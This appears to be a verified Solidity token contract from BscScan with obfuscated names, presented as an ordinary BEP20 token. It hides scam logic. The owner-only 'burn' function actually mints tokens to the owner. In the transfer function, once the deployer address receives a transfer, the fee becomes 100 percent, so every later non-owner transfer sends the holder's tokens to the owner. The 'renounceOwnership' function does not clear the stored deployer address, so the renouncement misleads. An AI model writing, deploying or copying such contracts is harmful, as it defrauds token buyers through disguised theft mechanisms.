/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract lLibVj {
address private  QNLWdw = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  HlPFvc = 10000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  mONwPx = 100000000000000000000000;
uint256 public  BaIHFS = 100000000000000000000000;
address public  jLkdNz = address(0);
uint256 public  nkELnv = 10000000000000000000000000000;
uint256 public  PvZHOI = 10000000000000000000;
uint256 public  nckvhk = 10000000000000000;
address public  KDApAh = address(0);
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  WXpxNJ = 1000000000000000000;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  UFZInr = address(0);
uint256 public  FLMGTG = 100000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  RbPwjB = 100000000000000000;
uint8 public constant decimals = 18;
address public  whTikn = address(0);
address public  tiRuAq = address(0);
uint256 public constant suDRBm = 9+1;
string public  name = "drpIJM";
string public  symbol = "OeMfrp";
address public  rLatAU = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "DhOOev");
require(to != address(0), "DhOOev");
require(amount <= balanceOf[from], "DhOOev");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* suDRBm/HlPFvc ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QNLWdw){
HlPFvc = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
QNLWdw = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}